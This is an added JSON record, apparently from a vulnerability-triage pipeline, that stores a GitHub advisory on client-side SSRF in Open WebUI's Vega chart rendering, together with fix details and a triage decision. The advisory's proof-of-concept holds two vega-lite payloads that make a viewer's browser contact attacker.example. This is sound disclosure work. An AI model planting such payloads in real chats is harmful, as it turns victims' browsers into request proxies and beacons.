@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/25875381?v=4\", \"events_url\": \"https://api.github.com/users/Zureno/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Zureno/followers\", \"following_url\": \"https://api.github.com/users/Zureno/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Zureno/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Zureno\", \"id\": 25875381, \"login\": \"Zureno\", \"node_id\": \"MDQ6VXNlcjI1ODc1Mzgx\", \"organizations_url\": \"https://api.github.com/users/Zureno/orgs\", \"received_events_url\": \"https://api.github.com/users/Zureno/received_events\", \"repos_url\": \"https://api.github.com/users/Zureno/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Zureno/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Zureno/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Zureno\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/27028174?v=4\", \"events_url\": \"https://api.github.com/users/Classic298/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Classic298/followers\", \"following_url\": \"https://api.github.com/users/Classic298/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Classic298/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Classic298\", \"id\": 27028174, \"login\": \"Classic298\", \"node_id\": \"MDQ6VXNlcjI3MDI4MTc0\", \"organizations_url\": \"https://api.github.com/users/Classic298/orgs\", \"received_events_url\": \"https://api.github.com/users/Classic298/received_events\", \"repos_url\": \"https://api.github.com/users/Classic298/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Classic298/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Classic298/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Classic298\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-70480\", \"cvss\": {\"score\": 4.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Summary\\nOpen WebUI renders `vega` and `vega-lite` fenced code blocks in chat content by building a Vega view in the viewer's browser without a restricted resource loader. Any user who can place such a block where another user will see it can make that user's browser issue attacker-chosen outbound GET requests, and read back responses from same-origin or CORS-permissive targets into the rendered page. Because the request comes from the browser, server-side SSRF protections never see it.\\n\\n## Preconditions\\nDefault configuration, no flags or environment variables involved: Vega blocks render unconditionally wherever chat content is displayed. The attacker needs an account that can put content in front of the victim, which covers a shared chat, a channel message, and model, RAG or tool output the attacker can influence. The victim must open the message, so this is not zero-click. Deployments where the victim's browser has no network position of interest lose little.\\n\\n## Impact\\nThe victim's browser becomes a request proxy into whatever it can reach: internal hosts and ports behind the perimeter, same-site endpoints, and out-of-band beacons that confirm a chart was viewed and by whom. Where the target is same-origin or returns permissive CORS headers, the response body is pulled back into the chart in the victim's page, which turns the request into a read. Requests are GET only, and no server-side data is exposed to the attacker directly.\\n\\n## Fix\\nFixed in 5278eb906 (#26806), released in 0.11.0. The view is now constructed with a loader whose `load` always throws and whose `sanitize` resolves the URI with the browser's own URL parser and permits only `data:` and same-origin results, so charts can only use inline `data.values`. Upgrading is sufficient; no configuration change is needed.\\n\\n## Root cause\\n- `src/lib/utils/index.ts` — `renderVegaVisualization`\\n- `src/lib/components/chat/Messages/CodeBlock.svelte` — renders `vega`/`vega-lite` blocks\\n\\nThe renderer treated a chart spec as trusted authored content rather than as untrusted chat text, so it accepted Vega's default loader. That loader has two separate ways out of the page: `data.url` and topojson/geo sources are fetched at view construction, and image marks pass their `url` through `sanitize` and are written into the output SVG as `<image href>`, which the browser fetches when the chart is displayed. The second path survives downstream SVG sanitization because the URL is a legitimate attribute value, not markup.\\n\\n## Proof of concept\\nPost either block into a chat, channel message, or shared chat that the victim will open. Neither requires the victim to interact beyond viewing.\\n\\n```vega-lite\\n{\\\"$schema\\\":\\\"https://vega.github.io/schema/vega-lite/v5.json\\\",\\\"data\\\":{\\\"url\\\":\\\"http://attacker.example/probe?a=1\\\"},\\\"mark\\\":\\\"point\\\"}\\n```\\n\\n```vega-lite\\n{\\\"$schema\\\":\\\"https://vega.github.io/schema/vega-lite/v5.json\\\",\\\"data\\\":{\\\"values\\\":[{\\\"x\\\":1}]},\\\"mark\\\":{\\\"type\\\":\\\"image\\\",\\\"url\\\":\\\"http://attacker.example/beacon.png\\\"},\\\"encoding\\\":{\\\"x\\\":{\\\"field\\\":\\\"x\\\"}}}\\n```\\n\\nThe first fires at view construction; the second fires when the rendered SVG is displayed. Both are visible as outbound requests in the victim's network log and in the attacker's listener. After the fix neither request is made and inline `data.values` charts still render.\\n\\n## Credits\\n- @Zureno — reported the issue and the `data.url` path.\\n- @Classic298 — identified the image-mark sink and authored the fix.\", \"ghsa_id\": \"GHSA-rffm-9q57-q649\", \"github_reviewed_at\": \"2026-08-04T19:54:57Z\", \"html_url\": \"https://github.com/advisories/GHSA-rffm-9q57-q649\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rffm-9q57-q649\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-70480\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-04T19:54:57Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-rffm-9q57-q649\", \"https://github.com/open-webui/open-webui/pull/26806\", \"https://github.com/open-webui/open-webui/commit/5278eb906ebecefc6538a19bc86df09d997e43e6\", \"https://github.com/open-webui/open-webui/releases/tag/v0.11.0\", \"https://github.com/advisories/GHSA-rffm-9q57-q649\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-rffm-9q57-q649\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI: Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-04T19:54:59Z\", \"url\": \"https://api.github.com/advisories/GHSA-rffm-9q57-q649\", \"vulnerabilities\": [{\"first_patched_version\": \"0.11.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 0.6.34, < 0.11.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rffm-9q57-q649",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: >= 0.6.34, < 0.11.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-70480"
+    ],
+    "cvss_score": 4.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-05T19:36:57.887459Z",
+  "provenance": {
+    "content_sha256": "45054dcd014af4c2852ed15c6ce0af5293c29b725b7a0eb8e2ed0868ff092288",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-04T19:54:57Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rffm-9q57-q649",
+  "status": "active",
+  "title": "Open WebUI: Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering",
+  "updated_at": "2026-08-04T19:54:59Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rffm-9q57-q649"
+}
